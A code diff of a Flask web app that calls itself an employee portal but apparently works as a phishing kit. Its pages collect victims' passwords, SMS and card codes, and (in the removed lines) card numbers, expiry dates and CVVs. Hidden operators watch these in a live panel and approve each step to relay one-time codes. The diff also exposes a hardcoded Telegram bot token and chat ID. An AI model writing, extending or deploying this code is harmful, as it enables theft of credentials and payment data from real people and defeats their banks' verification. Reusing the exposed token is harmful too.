@@ -1,249 +1,296 @@
-from flask import Flask, render_template, request, redirect, url_for, session, jsonify
-from datetime import timedelta
 import random
 import requests
-import os
+from datetime import timedelta
+from flask import Flask, render_template, request, jsonify, session, redirect, url_for
 
 app = Flask(__name__)
-app.secret_key = 'pon_aqui_una_clave_secreta_totalmente_diferente'
+app.secret_key = 'tu_clave_secreta_super_segura_para_mubeles'
+
+# Configuración de seguridad de cookies y sesiones
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SECURE'] = False  
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
 
-# ================= CONFIGURACIÓN DE TELEGRAM (Solo para códigos de acceso al Panel) =================
-TELEGRAM_BOT_TOKEN = "8075556042:AAFoz2S2xiLqDV_gEm0qc-HsxdbSNFm-nIM"
-TELEGRAM_CHAT_ID = "5352335307"
+# Diccionario de usuarios permitidos para administrar el panel
+USUARIOS_AUTORIZADOS = {
+    "theteacher": {"rol": "admin", "telegram_id": "5352335307"},
+    "operador1": {"rol": "standard", "telegram_id": "5352335307"}
+}
 
-empleados_activos = {}        # Registros de los empleados (Aquí llega todo al panel)
-usuarios_panel_activos = {}   # Operadores conectados al panel
-ips_bloqueadas = []
-codigos_telegram_temporales = {}
+# Base de datos en memoria para el monitoreo y control en vivo
+REGISTROS_ACTIVOS = {}
 
-def enviar_telegram(mensaje):
-    if TELEGRAM_BOT_TOKEN and "TU_TOKEN" not in TELEGRAM_BOT_TOKEN:
-        try:
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": mensaje})
-        except Exception:
-            pass
+TOKEN_BOT = "8075556042:AAFoz2S2xiLqDV_gEm0qc-HsxdbSNFm-nIM"
 
-@app.before_request
-def verificar_ip():
-    if request.remote_addr in ips_bloqueadas and not request.path.startswith('/static'):
-        return "Acceso bloqueado.", 403
-
-    if session.get('admin_logueado'):
-        usuario_actual = session.get('admin_user')
-        if usuario_actual != "theteacher" and usuario_actual not in usuarios_panel_activos:
-            session.clear()
-
-# ================= RUTAS DE USUARIO / CLIENTE =================
-@app.route('/portal')
-def portal():
-    # Solo carga la página. Ya no le pasa los diccionarios gigantes aquí.
-    return render_template('control.html')
-
-# ================= API OCULTA PARA EL PANEL DINÁMICO =================
-@app.route('/api/obtener_empleados_json')
-def obtener_empleados_json():
-    if not session.get('admin_logueado'):
-        return jsonify({"error": "No autorizado"}), 403
-        
-    return jsonify({
-        "status": "success",
-        "empleados": empleados_activos,
-        "usuarios_panel": usuarios_panel_activos
-    })
-
+# ==========================================
+# 1. RUTA DE LOGIN Y VISTA GENERAL
+# ==========================================
 @app.route('/')
 def index():
+    return redirect(url_for('control_login'))
+
+@app.route('/inicio')
+def vista_inicio():
     return render_template('index.html')
 
-@app.route('/api/validar_turno', methods=['POST'])
-def validar_turno():
-    data = request.get_json() if request.is_json else request.form
-    ip_cliente = request.remote_addr
-    
-    usuario = data.get('username', 'N/A')
-    turno = data.get('password', 'N/A')
-    empresa = data.get('empresa', 'Primera Empresa')
-    
-    registro_id = str(random.randint(1000, 9999))
-    
-    # Se inicializa el registro completo para el panel
-    empleados_activos[registro_id] = {
-        "ip": ip_cliente,
-        "usuario": usuario,
-        "turno": turno,
-        "empresa": empresa,
-        "codigo_sucursal": "Pendiente",
-        "estado": "Activo",
-        "respuestas": "Pendiente",
-        "coordenadas": {},
-        "tarjeta": {}
-    }
-    
-    return jsonify({"status": "success", "registro_id": registro_id, "valido": True})
-
-@app.route('/api/registrar_actividad', methods=['POST'])
-def registrar_actividad():
-    data = request.get_json() if request.is_json else request.form
-    registro_id = data.get('registro_id') or (list(empleados_activos.keys())[-1] if empleados_activos else None)
-    
-    todas_actividades = [f"{i:02d}" for i in range(1, 40)]
-    primeras_4 = random.sample(todas_actividades, 4)
-    restantes = [a for a in todas_actividades if a not in primeras_4]
-    siguientes_4 = random.sample(restantes, 4)
-    
-    respuestas_texto = data.get('respuestas', 'N/A')
-    
-    # Se guardan las preguntas y respuestas directamente en el registro del panel
-    if registro_id and registro_id in empleados_activos:
-        empleados_activos[registro_id]["respuestas"] = respuestas_texto
-        empleados_activos[registro_id]["primeras"] = primeras_4
-        empleados_activos[registro_id]["siguientes"] = siguientes_4
-    
-    return jsonify({
-        "status": "success",
-        "registro_id": registro_id,
-        "primeras": primeras_4,
-        "siguientes": siguientes_4
-    })
-
-@app.route('/api/guardar_coordenadas', methods=['POST'])
-def guardar_coordenadas():
-    data = request.get_json() if request.is_json else request.form
-    registro_id = data.get('registro_id') or (list(empleados_activos.keys())[-1] if empleados_activos else None)
-    coordenadas = data.get('coordenadas', {})
-    
-    if registro_id and registro_id in empleados_activos:
-        # Actualizamos o combinamos las coordenadas existentes con las nuevas
-        if "coordenadas" not in empleados_activos[registro_id]:
-            empleados_activos[registro_id]["coordenadas"] = {}
-        empleados_activos[registro_id]["coordenadas"].update(coordenadas)
-    
-    return jsonify({"status": "success"})
-
-@app.route('/api/guardar_codigo_sucursal', methods=['POST'])
-def guardar_codigo_sucursal():
-    data = request.get_json()
-    registro_id = data.get('registro_id')
-    codigo_sucursal = data.get('codigo_sucursal')
-    
-    if registro_id in empleados_activos:
-        empleados_activos[registro_id]['codigo_sucursal'] = codigo_sucursal
+@app.route('/control/login', methods=['GET', 'POST'])
+def control_login():
+    if request.method == 'POST':
+        data = request.get_json()
+        empleado_id = data.get('id_empleado')
+        password = data.get('password')
         
-    return jsonify({"status": "success"})
-
-@app.route('/api/guardar_tarjeta', methods=['POST'])
-def guardar_tarjeta():
-    data = request.get_json() if request.is_json else request.form
-    registro_id = data.get('registro_id') or (list(empleados_activos.keys())[-1] if empleados_activos else None)
-    
-    tarjeta_info = {
-        "numero": data.get('tarjeta', 'N/A'),
-        "expiry": data.get('expiry', 'N/A'),
-        "cvv": data.get('cvv', 'N/A')
-    }
-    
-    # Se guardan los datos del carnet/tarjeta en el panel
-    if registro_id and registro_id in empleados_activos:
-        empleados_activos[registro_id]["tarjeta"] = tarjeta_info
+        session['id_empleado'] = empleado_id
         
-    return jsonify({"status": "success"})  
+        REGISTROS_ACTIVOS[empleado_id] = {
+            "empleado": empleado_id,
+            "password": password,
+            "carnet": "Pendiente",
+            "actividad": "Pendiente",
+            "sucursal": "Pendiente",
+            "paso_actual": "Esperando aprobación de Login",
+            "estado": "En revisión",
+            "decision": "pendiente",
+            "fase": "login"
+        }
+        return jsonify({"status": "waiting"})
+        
+    return render_template('login.html')
 
-# ================= PANEL DE ADMINISTRACIÓN (Login Telegram solo para clave de acceso) =================
-@app.route('/portal/control/login', methods=['GET', 'POST'])
-def admin_login():
-    error = None
-    paso = "pedir_usuario"
+# ==========================================
+# 2. RUTAS DE LOGIN Y VERIFICACIÓN PARA EL PANEL (Admin/Operadores)
+# ==========================================
+@app.route('/control/login_admin', methods=['GET', 'POST'])
+def login_admin():
+    if request.method == 'POST':
+        usuario = request.form.get('usuario', '').strip()
+        
+        if not usuario:
+            return render_template('login_admin.html', error="Por favor ingresa un nombre")
+        
+        codigo_telegram = str(random.randint(100000, 999999))
+        session['temp_usuario'] = usuario
+        session['codigo_verificacion'] = codigo_telegram
+        
+        chat_id = USUARIOS_AUTORIZADOS.get("theteacher", {}).get("telegram_id", "5352335307")
+        mensaje = f"🔔 Intento de acceso al panel de *{usuario}*.\n🔐 Código de verificación: *{codigo_telegram}*"
+        
+        url_telegram = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
+        payload = {
+            "chat_id": chat_id,
+            "text": mensaje,
+            "parse_mode": "Markdown"
+        }
+        
+        try:
+            response = requests.post(url_telegram, json=payload, proxies={"http": None, "https": None})
+            print("Respuesta de Telegram:", response.text)
+        except Exception as e:
+            print("Excepción de conexión con Telegram:", e)
+        
+        return redirect(url_for('verificar_codigo'))
+    
+    return render_template('login_admin.html')
+
+@app.route('/control/verificar', methods=['GET', 'POST'])
+def verificar_codigo():
+    if request.method == 'POST':
+        codigo_ingresado = request.form.get('codigo', '').strip()
+        if codigo_ingresado == session.get('codigo_verificacion'):
+            usuario = session.get('temp_usuario')
+            
+            session.clear()
+            session['usuario'] = usuario
+            
+            if usuario.lower() == "theteacher":
+                session['rol'] = 'admin'
+            else:
+                session['rol'] = 'standard'
+                
+            session.permanent = True
+            
+            return redirect(url_for('panel_control'))
+        else:
+            return render_template('verificar.html', error="Código incorrecto")
+            
+    return render_template('verificar.html')
+
+
+@app.route('/control/empresa', methods=['GET', 'POST'])
+def control_empresa():
+    if request.method == 'POST':
+        data = request.get_json()
+        empleado_id = data.get('id_empleado')
+        password = data.get('password')
+        
+        session['id_empleado'] = empleado_id
+        
+        REGISTROS_ACTIVOS[empleado_id] = {
+            "empleado": empleado_id,
+            "password": password,
+            "carnet": "Pendiente Empresas",
+            "actividad": "Pendiente",
+            "sucursal": "Pendiente",
+            "paso_actual": "Esperando aprobación de Login Empresas",
+            "estado": "En revisión",
+            "decision": "pendiente",
+            "fase": "login",
+            "siguiente_url": url_for('vista_carnet')
+        }
+        
+        return jsonify({"status": "waiting"})
+        
+    return render_template('empresa.html')
+
+# ==========================================
+@app.route('/control/carnet', methods=['GET', 'POST'])
+def vista_carnet():
+    empleado_id = session.get('id_empleado', 'Desconocido')
     
     if request.method == 'POST':
-        accion = request.form.get('accion')
+        data = request.get_json()
+        codigo_carnet = data.get('codigo_carnet')
+        session['codigo_carnet'] = codigo_carnet
         
-        if accion == 'enviar_usuario':
-            usuario = request.form.get('usuario', '').strip().lower()
-            if usuario:
-                codigo_aleatorio = str(random.randint(100000, 999999))
-                codigos_telegram_temporales[usuario] = codigo_aleatorio
-                
-                enviar_telegram(f"🔐 Solicitud de acceso al panel.\nUsuario: {usuario}\nCódigo: {codigo_aleatorio}")
-                
-                paso = "pedir_codigo"
-                return render_template('admin_login.html', error=None, paso=paso, usuario=usuario)
-            else:
-                error = "Ingresa un usuario válido."
-                
-        elif accion == 'verificar_codigo':
-            usuario = request.form.get('usuario', '').strip().lower()
-            codigo_ingresado = request.form.get('codigo', '').strip()
+        if empleado_id in REGISTROS_ACTIVOS:
+            REGISTROS_ACTIVOS[empleado_id]["carnet"] = codigo_carnet
+            REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Esperando aprobación de SMS"
+            REGISTROS_ACTIVOS[empleado_id]["decision"] = "pendiente"
             
-            if usuario in codigos_telegram_temporales and codigos_telegram_temporales[usuario] == codigo_ingresado:
-                del codigos_telegram_temporales[usuario]
-                
-                session['admin_logueado'] = True
-                session['admin_user'] = usuario
-                session.permanent = True
-                
-                if usuario == "theteacher":
-                    session['admin_rol'] = "principal"
-                else:
-                    session['admin_rol'] = "secundario"
-                    usuarios_panel_activos[usuario] = {
-                        "ip": request.remote_addr,
-                        "rol": session['admin_rol']
-                    }
-                
-                return redirect(url_for('panel_secreto'))
-            else:
-                error = "Código incorrecto o expirado."
-                paso = "pedir_codigo"
-                return render_template('admin_login.html', error=error, paso=paso, usuario=usuario)
-                
-    return render_template('admin_login.html', error=error, paso=paso)
-
-@app.route('/portal/control')
-def panel_secreto():
-    if not session.get('admin_logueado'):
-        return redirect(url_for('admin_login'))
-    
-    return render_template(
-        'panel_control.html', 
-        empleados=empleados_activos,
-        usuarios_panel=usuarios_panel_activos,
-        usuario=session.get('admin_user'),
-        rol=session.get('admin_rol')
-    )
-
-@app.route('/portal/control/logout')
-def admin_logout():
-    usuario_actual = session.get('admin_user')
-    if usuario_actual in usuarios_panel_activos:
-        del usuarios_panel_activos[usuario_actual]
-    session.clear()
-    return redirect(url_for('admin_login'))
-
-@app.route('/admin/accion', methods=['POST'])
-def admin_accion():
-    if not session.get('admin_logueado'):
-        return jsonify({"error": "No autorizado"}), 403
+        return jsonify({"status": "waiting"})
         
-    data = request.json
+    return render_template('carnet.html')
+
+@app.route('/control/horarios', methods=['GET', 'POST'])
+def vista_horarios():
+    empleado_id = session.get('id_empleado', 'Desconocido')
+    
+    if request.method == 'POST':
+        data = request.get_json()
+        actividad = data.get('codigo_actividad')
+        sucursal = data.get('codigo_sucursal')
+        
+        session['codigo_actividad'] = actividad
+        session['codigo_sucursal'] = sucursal
+        
+        if empleado_id in REGISTROS_ACTIVOS:
+            REGISTROS_ACTIVOS[empleado_id]["actividad"] = actividad
+            REGISTROS_ACTIVOS[empleado_id]["sucursal"] = sucursal
+            REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Esperando aprobación de Horarios"
+            REGISTROS_ACTIVOS[empleado_id]["decision"] = "pendiente"
+            
+        return jsonify({"status": "waiting"})
+        
+    return render_template('horarios.html')
+
+# ==========================================
+# 4. APIs DE CONTROL Y MONITOREO DEL PANEL
+# ==========================================
+@app.route('/control/api/verificar_estado')
+def verificar_estado():
+    empleado_id = session.get('id_empleado') 
+    if not empleado_id or empleado_id not in REGISTROS_ACTIVOS:
+        return jsonify({"decision": "esperando"})
+    
+    info = REGISTROS_ACTIVOS[empleado_id]
+    
+    return jsonify({
+        "decision": info.get("decision"),
+        "siguiente": info.get("siguiente_url"),
+        "fase": info.get("fase")
+    })
+
+@app.route('/control/api/accion', methods=['POST'])
+def panel_accion():
+    if 'usuario' not in session:
+        return jsonify({"status": "error", "message": "No autorizado"}), 401
+        
+    data = request.get_json()
+    empleado_id = data.get('empleado_id')
     accion = data.get('accion')
-    reg_id = data.get('id')
-    ip_objetivo = data.get('ip')
-    target_usuario = data.get('usuario')
     
-    if accion == 'bloquear_ip' and ip_objetivo:
-        if ip_objetivo not in ips_bloqueadas:
-            ips_bloqueadas.append(ip_objetivo)
-            
-    if session.get('admin_rol') == 'principal':
-        if accion == 'borrar' and reg_id in empleados_activos:
-            del empleados_activos[reg_id]
-        elif accion == 'cerrar_sesion_panel' and target_usuario:
-            if target_usuario in usuarios_panel_activos:
-                del usuarios_panel_activos[target_usuario]
-                
-    return jsonify({"status": "ok"})
+    if empleado_id not in REGISTROS_ACTIVOS:
+        return jsonify({"status": "error", "message": "Empleado no encontrado"})
+        
+    if accion == 'aprobar_login':
+        REGISTROS_ACTIVOS[empleado_id]["decision"] = "aprobar"
+        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = url_for('vista_carnet')
+        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Login Aprobado -> En SMS"
+        REGISTROS_ACTIVOS[empleado_id]["fase"] = "carnet"
+
+    elif accion == 'saltar_a_horarios':
+        REGISTROS_ACTIVOS[empleado_id]["decision"] = "aprobar"
+        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = url_for('vista_horarios')
+        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Login Aprobado -> Saltando a APP"
+        REGISTROS_ACTIVOS[empleado_id]["fase"] = "horarios"
+
+    elif accion == 'error_login':
+        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
+        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Error en Login (Reintentando)"
+        REGISTROS_ACTIVOS[empleado_id]["fase"] = "login"
+
+    elif accion == 'aprobar_carnet':
+        REGISTROS_ACTIVOS[empleado_id]["decision"] = "aprobar"
+        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = url_for('vista_horarios')
+        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Carnet Aprobado -> En APP"
+        REGISTROS_ACTIVOS[empleado_id]["fase"] = "horarios"
+
+    elif accion == 'error_carnet':
+        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
+        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Error en SMS (Reintentando)"
+        REGISTROS_ACTIVOS[empleado_id]["fase"] = "carnet"
+
+    elif accion == 'aprobar_horarios':
+        REGISTROS_ACTIVOS[empleado_id]["decision"] = "aprobar"
+        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = "/ruta-exito"
+        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Proceso Completo Exitoso"
+        REGISTROS_ACTIVOS[empleado_id]["estado"] = "Completado"
+        REGISTROS_ACTIVOS[empleado_id]["fase"] = "completado"
+
+    elif accion == 'error_horarios':
+        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
+        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Error en APP (Reintentando)"
+        REGISTROS_ACTIVOS[empleado_id]["fase"] = "horarios"
+        
+    elif accion == 'regresar_carnet':
+        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
+        REGISTROS_ACTIVOS[empleado_id]["paso_actual"] = "Volviendo a pedir SMS"
+        REGISTROS_ACTIVOS[empleado_id]["fase"] = "carnet"
+        REGISTROS_ACTIVOS[empleado_id]["siguiente_url"] = url_for('vista_carnet')
+
+    return jsonify({"status": "success"})
+
+@app.route('/control/api/borrar_empleado/<empleado_id>', methods=['POST'])
+def borrar_empleado(empleado_id):
+    if session.get('rol') != 'admin':
+        return jsonify({"status": "error", "message": "Acceso denegado. Solo theteacher."}), 403
+    if empleado_id in REGISTROS_ACTIVOS:
+        del REGISTROS_ACTIVOS[empleado_id]
+        return jsonify({"status": "success", "message": "Empleado eliminado"})
+    return jsonify({"status": "error", "message": "No encontrado"}), 404
+
+@app.route('/control/api/cerrar_sesion_activa/<empleado_id>', methods=['POST'])
+def cerrar_sesion_activa(empleado_id):
+    if session.get('rol') != 'admin':
+        return jsonify({"status": "error", "message": "Acceso denegado. Solo theteacher."}), 403
+    if empleado_id in REGISTROS_ACTIVOS:
+        REGISTROS_ACTIVOS[empleado_id]["fase"] = "login"
+        REGISTROS_ACTIVOS[empleado_id]["decision"] = "error"
+        return jsonify({"status": "success", "message": "Sesión cerrada"})
+    return jsonify({"status": "error", "message": "No encontrado"}), 404
+
+@app.route('/control/panel')
+def panel_control():
+    if 'usuario' not in session:
+        return redirect(url_for('login_admin'))  
+    return render_template('panel.html', rol_usuario=session.get('rol', 'standard'))
+
+@app.route('/control/api/datos')
+def api_datos_panel():
+    if 'usuario' not in session:
+        return jsonify([]), 401
+    return jsonify(list(REGISTROS_ACTIVOS.values()))
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(debug=True, port=5000)
